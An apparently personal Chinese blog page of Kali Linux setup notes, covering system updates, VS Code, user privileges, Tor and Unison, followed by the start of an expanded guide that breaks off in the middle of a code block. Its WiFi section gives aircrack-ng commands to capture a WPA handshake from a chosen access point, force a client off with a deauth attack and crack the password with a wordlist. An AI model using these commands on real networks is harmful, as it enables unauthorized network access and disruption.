<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="更新与升级\nsudo apt upgrade -y\nsudo apt autoremove\n去官网VSC下载后缀.deb包\ncd Downloads\nsudo apt install ./code_1.82.3-1696245001_amd64.deb\n注意：指定文件的时候要用./来指定为当前目录的文件\n会有一个报错\n解决方法：\nmv ./code_182.3-1696245001_amd64.deb /tmp\n把deb安装包移动到/tmp这个文件夹里\n"><title>Kali</title><link rel=canonical href=http://localhost:1313/posts/kali/><link rel=stylesheet href=/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css><meta property='og:title' content="Kali"><meta property='og:description' content="更新与升级\nsudo apt upgrade -y\nsudo apt autoremove\n去官网VSC下载后缀.deb包\ncd Downloads\nsudo apt install ./code_1.82.3-1696245001_amd64.deb\n注意：指定文件的时候要用./来指定为当前目录的文件\n会有一个报错\n解决方法：\nmv ./code_182.3-1696245001_amd64.deb /tmp\n把deb安装包移动到/tmp这个文件夹里\n"><meta property='og:url' content='http://localhost:1313/posts/kali/'><meta property='og:site_name' content='JustWin'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-11-19T00:00:00+00:00'><meta property='article:modified_time' content='2025-11-19T00:00:00+00:00'><meta property='og:image' content='http://localhost:1313/'><meta name=twitter:title content="Kali"><meta name=twitter:description content="更新与升级\nsudo apt upgrade -y\nsudo apt autoremove\n去官网VSC下载后缀.deb包\ncd Downloads\nsudo apt install ./code_1.82.3-1696245001_amd64.deb\n注意：指定文件的时候要用./来指定为当前目录的文件\n会有一个报错\n解决方法：\nmv ./code_182.3-1696245001_amd64.deb /tmp\n把deb安装包移动到/tmp这个文件夹里\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='http://localhost:1313/'><link rel=stylesheet href=/css/custom.css><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/images/avatar_hu_89ca753ea8ea85c7.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>✍️</span></figure><div class=site-meta><h1 class=site-name><a href=/>JustWin</a></h1><h2 class=site-description>分享技术与生活</h2></div></header><ol class=menu-social><li><a href=https://github.com/passion-win target=_blank title=GitHub rel=me><svg width="800" height="800" viewBox="0 0 20 20" xmlns:xlink="http://www.w3.org/1999/xlink"><title>github [#142]</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="#000"><g id="icons" transform="translate(56.000000, 160.000000)"><path d="M94 7399C99.523 7399 104 7403.59 104 7409.253 104 7413.782 101.138 7417.624 97.167 7418.981 96.66 7419.082 96.48 7418.762 96.48 7418.489 96.48 7418.151 96.492 7417.047 96.492 7415.675 96.492 7414.719 96.172 7414.095 95.813 7413.777 98.04 7413.523 100.38 7412.656 100.38 7408.718 100.38 7407.598 99.992 7406.684 99.35 7405.966 99.454 7405.707 99.797 7404.664 99.252 7403.252 99.252 7403.252 98.414 7402.977 96.505 7404.303 95.706 7404.076 94.85 7403.962 94 7403.958 93.15 7403.962 92.295 7404.076 91.497 7404.303 89.586 7402.977 88.746 7403.252 88.746 7403.252 88.203 7404.664 88.546 7405.707 88.649 7405.966 88.01 7406.684 87.619 7407.598 87.619 7408.718 87.619 7412.646 89.954 7413.526 92.175 7413.785 91.889 7414.041 91.63 7414.493 91.54 7415.156 90.97 7415.418 89.522 7415.871 88.63 7414.304 88.63 7414.304 88.101 7413.319 87.097 7413.247 87.097 7413.247 86.122 7413.234 87.029 7413.87 87.029 7413.87 87.684 7414.185 88.139 7415.37 88.139 7415.37 88.726 7417.2 91.508 7416.58 91.513 7417.437 91.522 7418.245 91.522 7418.489 91.522 7418.76 91.338 7419.077 90.839 7418.982 86.865 7417.627 84 7413.783 84 7409.253 84 7403.59 88.478 7399 94 7399" id="github-[#142]"/></g></g></g></svg></a></li><li><a href=https://t.me/+TFjBeZzowwU1YTY1 target=_blank title=telegram rel=me><svg viewBox="0 0 640 640"><path d="M320 72C183 72 72 183 72 320S183 568 320 568 568 457 568 320 457 72 320 72zM435 240.7C431.3 279.9 415.1 375.1 406.9 419c-3.5 18.6-10.3 24.8-16.9 25.4C375.6 445.7 364.7 434.9 350.7 425.7c-21.8-14.3-34.2-23.2-55.3-37.2C270.9 372.4 286.8 363.5 300.7 349 304.4 345.2 367.8 287.5 369 282.3 369.2 281.6 369.3 279.2 367.8 277.9 366.3 276.6 364.2 277.1 362.7 277.4 360.5 277.9 325.6 300.9 258.1 346.5 248.2 353.3 239.2 356.6 231.2 356.4 222.3 356.2 205.3 351.4 192.6 347.3 177.1 342.3 164.7 339.6 165.8 331 166.4 326.5 172.5 322 184.2 317.3 256.5 285.8 304.7 265 328.8 255c68.9-28.6 83.2-33.6 92.5-33.8C423.4 221.2 427.9 221.7 430.9 224.1 432.9 225.8 434.1 228.2 434.4 230.8 434.9 234 435 237.3 434.8 240.6z"/></svg></a></li><li><a href=https://twitter.com/@win1688888888 target=_blank title=twitter rel=me><svg width="800" height="800" viewBox="0 -2 20 20" xmlns:xlink="http://www.w3.org/1999/xlink"><title>twitter [#154]</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Dribbble-Light-Preview" transform="translate(-60.000000, -7521.000000)" fill="#000"><g id="icons" transform="translate(56.000000, 160.000000)"><path d="M10.29 7377C17.837 7377 21.965 7370.84365 21.965 7365.50546 21.965 7365.33021 21.965 7365.15595 21.953 7364.98267 22.756 7364.41163 23.449 7363.70276 24 7362.8915 23.252 7363.21837 22.457 7363.433 21.644 7363.52751 22.5 7363.02244 23.141 7362.2289 23.448 7361.2926 22.642 7361.76321 21.761 7362.095 20.842 7362.27321 19.288 7360.64674 16.689 7360.56798 15.036 7362.09796 13.971 7363.08447 13.518 7364.55538 13.849 7365.95835 10.55 7365.79492 7.476 7364.261 5.392 7361.73762 4.303 7363.58363 4.86 7365.94457 6.663 7367.12996 6.01 7367.11125 5.371 7366.93797 4.8 7366.62489V7366.67608C4.801 7368.5989 6.178 7370.2549 8.092 7370.63591 7.488 7370.79836 6.854 7370.82199 6.24 7370.70483 6.777 7372.35099 8.318 7373.47829 10.073 7373.51078 8.62 7374.63513 6.825 7375.24554 4.977 7375.24358 4.651 7375.24259 4.325 7375.22388 4 7375.18549 5.877 7376.37088 8.06 7377 10.29 7376.99705" id="twitter-[#154]"/></g></g></g></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><span>首页</span></a></li><li><a href=/archives/><span>归档</span></a></li><li><a href=/about/><span>关于</span></a></li><li><a href=/links/><span>网站分享</span></a></li><li><a href=/blockchain/><span>待定</span></a></li><li><a href=/docker/><span>docker</span></a></li><li><a href=/k8s/><span>k8s</span></a></li><li><a href><span></span></a></li><li class=menu-bottom-section><ol class=menu><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language title=language onchange="window.location.href=this.selectedOptions[0].value"><option value=http://localhost:1313/ selected>中文</option><option value=http://localhost:1313/en/>English</option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#一系统更新与维护基础但关键>一、系统更新与维护（基础但关键）</a><ol><li><a href=#原文问题>原文问题</a></li><li><a href=#详细正确操作>详细正确操作</a></li></ol></li><li><a href=#二vs-code安装修正与优化>二、VS Code安装（修正与优化）</a><ol><li><a href=#原文错误分析>原文错误分析</a></li><li><a href=#完整安装方案>完整安装方案</a><ol><li><a href=#方法一官方推荐方式自动更新>方法一：官方推荐方式（自动更新）</a></li><li><a href=#方法二手动安装deb包适合离线环境>方法二：手动安装.deb包（适合离线环境）</a></li></ol></li></ol></li><li><a href=#三用户权限管理安全核心>三、用户权限管理（安全核心）</a><ol><li><a href=#原文错误分析-1>原文错误分析</a></li><li><a href=#安全最佳实践>安全最佳实践</a></li></ol></li><li><a href=#四tor浏览器安全增强版>四、Tor浏览器（安全增强版）</a><ol><li><a href=#原文错误分析-2>原文错误分析</a></li><li><a href=#安全安装流程>安全安装流程</a></li></ol></li><li><a href=#五终端增强terminator与替代方案>五、终端增强（Terminator与替代方案）</a><ol><li><a href=#详细安装与配置>详细安装与配置</a></li></ol></li><li><a href=#六文件同步unison与更优方案>六、文件同步（Unison与更优方案）</a><ol><li><a href=#原理与完整配置>原理与完整配置</a></li></ol></li><li><a href=#七无线安全测试aircrack-ng终极详解>七、无线安全测试（Aircrack-ng终极详解）</a><ol><li><a href=#原文重大错误修正>原文重大错误修正</a></li><li><a href=#完整渗透测试流程仅用于授权测试>完整渗透测试流程（仅用于授权测试）</a><ol><li><a href=#步骤0法律与道德警告>步骤0：法律与道德警告</a></li><li><a href=#步骤1硬件识别与驱动检查>步骤1：硬件识别与驱动检查</a></li><li><a href=#步骤2启动监听模式>步骤2：启动监听模式</a></li><li><a href=#步骤3扫描目标网络>步骤3：扫描目标网络</a></li><li><a href=#步骤4精准捕获握手包>步骤4：精准捕获握手包</a></li><li><a href=#步骤5主动攻击加速握手获取>步骤5：主动攻击加速握手获取</a></li><li><a href=#步骤6离线破解密码>步骤6：离线破解密码</a></li><li><a href=#步骤7结果验证与清理>步骤7：结果验证与清理</a></li></ol></li></ol></li><li><a href=#八kali-linux核心知识点补充>八、Kali Linux核心知识点补充</a><ol><li><a href=#1-kali特有目录结构>1. Kali特有目录结构</a></li><li><a href=#2-系统服务管理现代方法>2. 系统服务管理（现代方法）</a></li><li><a href=#3-网络管理革命iproute2>3. 网络管理革命（iproute2）</a></li><li><a href=#4-kali-metapackages按需安装>4. Kali Metapackages（按需安装）</a></li><li><a href=#5-python环境管理>5. Python环境管理</a></li><li><a href=#6-持久化live-usb>6. 持久化Live USB</a></li><li><a href=#7-日志与取证>7. 日志与取证</a></li><li><a href=#8-编译安装内核驱动解决网卡问题>8. 编译安装内核驱动（解决网卡问题）</a></li></ol></li><li><a href=#九安全与隐蔽操作opsec>九、安全与隐蔽操作（OPSEC）</a><ol><li><a href=#1-mac地址欺骗>1. MAC地址欺骗</a></li><li><a href=#2-tor透明代理>2. Tor透明代理</a></li><li><a href=#3-日志清理>3. 日志清理</a></li><li><a href=#4-虚拟机反检测>4. 虚拟机反检测</a></li></ol></li><li><a href=#十故障排查宝典>十、故障排查宝典</a><ol><li><a href=#1-airmon-ng无法启动>1. airmon-ng无法启动</a></li><li><a href=#2-apt安装失败>2. apt安装失败</a></li><li><a href=#3-tor无法连接>3. Tor无法连接</a></li></ol></li><li><a href=#十一效率工具与别名>十一、效率工具与别名</a></li><li><a href=#最终建议>最终建议</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/kali/>Kali</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2025-11-19</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>阅读时长: 20 分钟</time></div></footer></div></header><section class=article-content><p>更新与升级</p><p>sudo apt upgrade -y</p><p>sudo apt autoremove</p><p>去官网VSC下载后缀.deb包</p><p>cd Downloads</p><p>sudo apt install ./code_1.82.3-1696245001_amd64.deb</p><p>注意：指定文件的时候要用./来指定为当前目录的文件</p><p>会有一个报错</p><p>解决方法：</p><p>mv ./code_182.3-1696245001_amd64.deb /tmp</p><p>把deb安装包移动到/tmp这个文件夹里</p><p>重新安装，sudo apt install /tmp/code_1.82.3-1696245001_amd64.deb</p><p>用 <code>code .</code> 就可以打开使用了</p><p>修改权限（尤其是装在虚拟机里的）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo su          <span class=c1>#先用sudo su 切换为root用户</span>
</span></span><span class=line><span class=cl>adduser justwin      
</span></span><span class=line><span class=cl><span class=c1>#注册一名新用户可以用adduser命令，格式:adduser 用户名</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>passwd 用户名  <span class=c1>#用passwd来修改密码</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>usermod --append --groups sudo justwin   <span class=c1>#添加权限，这个意思是把sudo 这个组加在justwin用户上，同时不想抹掉用户原来的组，需要配合--append进行使用.</span>
</span></span><span class=line><span class=cl>缩写：usermod -aG sudo 用户名，是一样的作用
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>groups 用户名  <span class=c1>#可以查看新用户被添加进sudo组</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>su justwin   <span class=c1>#    进入</span>
</span></span><span class=line><span class=cl>sudo -l   <span class=c1>#   确认新用户是否有提高权限</span>
</span></span></code></pre></td></tr></table></div></div><p>tor浏览器</p><p>一样下载到Downloads文件夹里 下载后缀tar.xz文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> Downloads/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>解压
</span></span><span class=line><span class=cl>tar -xvJf 文件名.tar.xz         <span class=c1>#J是大写</span>
</span></span><span class=line><span class=cl>示例：tar -xvJf tor-browser-linux64-12.5.6_ALL.tar.xz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>执行
</span></span><span class=line><span class=cl>./tor-browser/Browser/start-tor-browser
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>check.torproject.org 访问这个网址查看自己是否已连接洋葱网络
</span></span></code></pre></td></tr></table></div></div><p>终端</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install terminator -y
</span></span></code></pre></td></tr></table></div></div><p>文件同步</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>使用Unison
</span></span><span class=line><span class=cl>可以在github上找到，在windows上安装
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>在再kali安装
</span></span><span class=line><span class=cl>sudo apt install unison -y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>unison 本机文件夹路径 ssh://用户@ip:端口//虚拟机文件夹路径
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>airmon-ng start 网卡名称
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>airodump-ng 网卡监听名称
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>airodump-ng wifi名称 网卡监听名称
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>aireplay-ng wifi信息 网卡监听名称
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>aircrack-ng -w 密码字典 握手包数据
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>iwconfig/ifconfig 查看网卡信息
</span></span><span class=line><span class=cl>看到你的是wlan0就用wlan0，如果是wlan0mon，就是用wlan0mon
</span></span><span class=line><span class=cl>airmon-ng start wlan0 <span class=o>(</span>网卡名称<span class=o>)</span> 设置网卡为监听模式
</span></span><span class=line><span class=cl>airodump-ng wlan0 <span class=o>(</span>网卡名称<span class=o>)</span>扫描附近WIFI
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#监听并抓取握手包</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mkdir /home/kali/桌面/
</span></span><span class=line><span class=cl>airodump-ng -c <span class=m>11</span> --bssid B0:D5:9D:42:FA:A3 -w 文件路径 wlan0mon
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>11是你选用的CH，CH是几，你就用几
</span></span><span class=line><span class=cl>-c指定信道，一定要是上一步查到的要破解的wifi所用信道
</span></span><span class=line><span class=cl>-bssid指定bssid值，一定要是上一步查到的要破解的wifi的bssid
</span></span><span class=line><span class=cl>-w指定捕获的握手到保存到的文件名
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>WEP:有效对等加密
</span></span><span class=line><span class=cl>WAP:wifi访问保护
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#是其掉线重连</span>
</span></span><span class=line><span class=cl>aireplay-ng -0 <span class=m>10</span> -a B0:D5:9D:42:FA:A3 -c C4:F0:81:02:87:5E wlan0mon
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-0表示通知设备断开连接
</span></span><span class=line><span class=cl>10表示deauth攻击次数，小点大点都行
</span></span><span class=line><span class=cl>-a表示仿造的wifi的mac地址（即bssid）
</span></span><span class=line><span class=cl>-c表示要让认证失效的设备的Mac地址，在上一步中可以看到
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#使用字典破解密码</span>
</span></span><span class=line><span class=cl>aircrack-ng -w 字典文件名.lst -b B0:D5:9D:42:FA:A3握手包文件名.cap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>aircrack-ng -w /home/kali/桌面/password.txt -b 12:83:57:00:80:00 /home/kali/桌面/handshake-0*.cap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>共享目录：aircrack-ng -w /mnt/hgfs/password.txt -b 6A:50:CC:AB:EE:47 /home/kali/桌面/handshake-0*.cap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-w指定要使用口令字典文件
</span></span><span class=line><span class=cl>-b指定要目标wifi的mac地址（即bssid）
</span></span><span class=line><span class=cl>wifi_ivs_file*.cp是抓取到握手包的数据包文件，*是通配符
</span></span></code></pre></td></tr></table></div></div><h1 id=kali-linux-终极完全指南从基础到渗透测试的详细解析>Kali Linux 终极完全指南：从基础到渗透测试的详细解析</h1><p>这是一份经过全面修正、深度扩展并补充完整原理说明的Kali Linux使用文档。我将逐行分析原文错误，并提供最详尽的技术解析。</p><hr><h2 id=一系统更新与维护基础但关键>一、系统更新与维护（基础但关键）</h2><h3 id=原文问题>原文问题</h3><p>原文只写了两条命令，但缺少核心更新命令，且未解释执行逻辑。</p><h3 id=详细正确操作>详细正确操作</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 更新软件包索引（从所有配置的源获取最新软件列表）</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：同步本地数据库与远程仓库，知道哪些软件可以升级</span>
</span></span><span class=line><span class=cl><span class=c1># 网络流量：约1-5MB</span>
</span></span><span class=line><span class=cl><span class=c1># 执行频率：每次安装软件前都应该执行</span>
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 升级所有可升级的软件包（不删除旧包，不自动处理依赖变化）</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：将已安装的软件包更新到最新版本</span>
</span></span><span class=line><span class=cl><span class=c1># 风险：极低，属于常规安全更新</span>
</span></span><span class=line><span class=cl><span class=c1># 耗时：取决于升级数量，5-30分钟</span>
</span></span><span class=line><span class=cl><span class=c1># 参数-y：自动回答&#34;yes&#34;，避免交互提示</span>
</span></span><span class=line><span class=cl>sudo apt upgrade -y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 完整升级（处理依赖关系变化，可能添加/删除包）</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：解决upgrade无法处理的依赖冲突，进行系统级重大更新</span>
</span></span><span class=line><span class=cl><span class=c1># 风险：中等，可能影响系统稳定性，建议在执行前查看变更列表</span>
</span></span><span class=line><span class=cl><span class=c1># 使用场景：发行版版本升级、内核更新</span>
</span></span><span class=line><span class=cl>sudo apt full-upgrade -y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 4. 自动移除不再需要的依赖包</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：清理因升级而被孤立的旧依赖，释放磁盘空间</span>
</span></span><span class=line><span class=cl><span class=c1># 清理量：通常50-500MB</span>
</span></span><span class=line><span class=cl>sudo apt autoremove -y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 5. 清理已下载的.deb安装包缓存</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：/var/cache/apt/archives/目录可能积累大量旧版本安装包</span>
</span></span><span class=line><span class=cl><span class=c1># 清理量：可能达到数GB</span>
</span></span><span class=line><span class=cl>sudo apt clean
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 6. 查看可更新软件列表（推荐先查看再升级）</span>
</span></span><span class=line><span class=cl>apt list --upgradable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 7. Kali Linux专属：安装所有最新工具</span>
</span></span><span class=line><span class=cl><span class=c1># kali-linux-large：包含2000+工具（推荐）</span>
</span></span><span class=line><span class=cl><span class=c1># kali-linux-everything：包含所有工具（3000+，占用空间大）</span>
</span></span><span class=line><span class=cl>sudo apt install -y kali-linux-large
</span></span></code></pre></td></tr></table></div></div><p><strong>底层原理</strong>：APT(Advanced Package Tool)使用dpkg作为底层包管理系统，通过sources.list配置源地址，维护一个本地数据库(/var/lib/apt/lists/)来追踪可用软件版本。</p><hr><h2 id=二vs-code安装修正与优化>二、VS Code安装（修正与优化）</h2><h3 id=原文错误分析>原文错误分析</h3><ol><li><strong>文件名错误</strong>：<code>code_182.3-1696245001_amd64.deb</code>漏了小数点，应为<code>code_1.82.3...</code></li><li><strong>流程冗余</strong>：无需移动到/tmp目录，这是误传</li><li><strong>缺少现代方法</strong>：未提及GPG密钥和仓库的自动化安装</li></ol><h3 id=完整安装方案>完整安装方案</h3><h4 id=方法一官方推荐方式自动更新>方法一：官方推荐方式（自动更新）</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
